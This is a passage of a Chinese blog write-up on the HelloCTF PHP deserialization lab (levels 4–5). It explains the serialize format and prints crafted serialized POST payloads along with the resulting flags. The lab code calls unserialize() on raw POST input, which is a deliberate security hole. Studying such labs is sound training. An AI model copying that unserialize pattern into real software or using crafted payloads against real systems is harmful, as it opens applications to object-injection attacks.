+<li><code>10</code>: 表示类名的长度是 10个字符 (<code>SecretVault</code>)。</li>
+<li><code>&quot;SecretVault&quot;</code>: 类名。</li>
+<li><code>2</code>: 表示这个对象有 2个属性。</li>
+<li><code>&#123;...&#125;</code>: 花括号里是所有属性的描述。</li>
+<li><code>s:5:&quot;owner&quot;;s:5:&quot;Alice&quot;;</code>: 描述 <code>public</code> 属性 <code>owner</code>，<code>s</code> 代表字符串，<code>5</code> 是长度。</li>
+<li><code>s:25:&quot;\0SecretVault\0secret_key&quot;;s:9:&quot;CTF&#123;...&#125;&quot;;</code>: 描述 <code>private</code> 属性 <code>secret_key</code>。<br>
+<strong>这里出现了带空字节的特殊键名，可利用序列化处理获取 flag</strong>。</li>
+</ul>
+<p>依赖这个原理，构造这样的 payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag_is_here</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>得到(做一下切分处理，大括号拆开，分号隔行)：</p>
+<pre class="line-numbers language-none"><code class="language-none">O:4:&quot;FLAG&quot;:3:
+&#123;
+s:18:&quot; FLAG flag1_string&quot;;
+s:8:&quot;ser4l1ze&quot;;
+s:18:&quot; FLAG flag2_number&quot;;
+i:2;
+s:18:&quot; FLAG flag3_object&quot;;
+O:5:&quot;FLAG3&quot;:1:&#123;s:25:&quot; FLAG3 flag3_object_array&quot;;
+a:2:&#123;i:0;
+s:3:&quot;se3&quot;;
+i:1;
+s:2:&quot;me&quot;;&#125;
+	&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>把 s 开头也就是 string 全部提取出来，得到：</p>
+<ul>
+<li>Flag 1_string:  ser4l1ze,</li>
+<li>Flag2_number:  2,</li>
+<li>Flag3_object: se3, me<br>
+根据出现顺序，得到 flag（用下划线连接）</li>
+</ul>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;ser4l1ze_2_se3_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<hr>
+<h2 id="Level-5">Level 5</h2>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+  
+<span class="token comment">/*  
+--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 ---   
+  
+HINT：各有千秋~  
+  
+# -*- coding: utf-8 -*-  
+# @Author: 探姬  
+# @Date:   2024-07-01 20:30  
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  
+# @email:  admin@hello-ctf.com  
+# @link:   hello-ctf.com  
+  
+*/</span>  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">a_class</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token variable">$a_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF"</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+<span class="token variable">$a_object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a_class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$a_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>a<span class="token operator">=></span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">,</span>b<span class="token operator">=></span><span class="token string double-quoted-string">"CTF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$a_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF"</span><span class="token punctuation">;</span>  
+<span class="token variable">$a_number</span> <span class="token operator">=</span> <span class="token number">678470</span><span class="token punctuation">;</span>  
+<span class="token variable">$a_boolean</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>  
+<span class="token variable">$a_null</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+<span class="token comment">/*See How to serialize:  
+a_object: O:7:"a_class":1:&#123;s:7:"a_value";s:8:"HelloCTF";&#125;  
+a_array: a:2:&#123;s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";&#125;  
+a_string: s:8:"HelloCTF";  
+a_number: i:678470;  
+a_boolean: ;  
+a_null: N;  
+Now your turn!*/</span>
+
+<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>  
+  
+<span class="token variable">$your_object</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$your_array</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$your_string</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$your_number</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$your_boolean</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$your_NULL</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">if</span><span class="token punctuation">(</span>    
+	<span class="token variable">$your_boolean</span> <span class="token operator">&amp;&amp;</span>     
+	<span class="token variable">$your_NULL</span> <span class="token operator">==</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span>    
+	<span class="token variable">$your_string</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"IWANT"</span> <span class="token operator">&amp;&amp;</span>    
+	<span class="token variable">$your_number</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>    
+	<span class="token variable">$your_object</span><span class="token operator">-></span><span class="token property">a_value</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"FLAG"</span> <span class="token operator">&amp;&amp;</span>    
+	<span class="token variable">$your_array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Plz"</span> <span class="token operator">&amp;&amp;</span> 
+	<span class="token variable">$your_array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Give_M3"</span>  
+<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You really know how to serialize?"</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>
+
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>答案都已经在明面上了～我们 POST 一个序列化，令其反序列化的数据等于题目所需即可。</p>
+<p>构造 POST payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">o<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a_class"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a_value"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token operator">&amp;</span>a<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Plz"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Give_M3"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token operator">&amp;</span>s<span class="token operator">=</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"IWANT"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>i<span class="token operator">=</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>b<span class="token operator">=</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>n<span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<hr>
+<p>未完待续……</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Moyuin, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags text-capitalize">
+            
+            <i class="icon"></i>
+            <a href="/tags/学习/" class="tag">#学习</a><a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/writeup/" class="tag">#writeup</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        <a class="next"></a>
+        
+        <a href="/2025/07/01/xue-xi/suan-fa/yi-xie-suan-fa-bi-ji/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">一些算法笔记</h3>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    <!-- ✅ 替换成 Twikoo 评论 -->
+    
+    
+    
+</article>
+
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a target="_blank" rel="noopener" href="https://blog.moyuin.top" class="item">Blog</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/moyuin-aka" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://x.com/Moyuin1" class="item">Twitter</a>
+                
+                <a href="mailto:me@moyuin.top" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2025 Moyuin<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
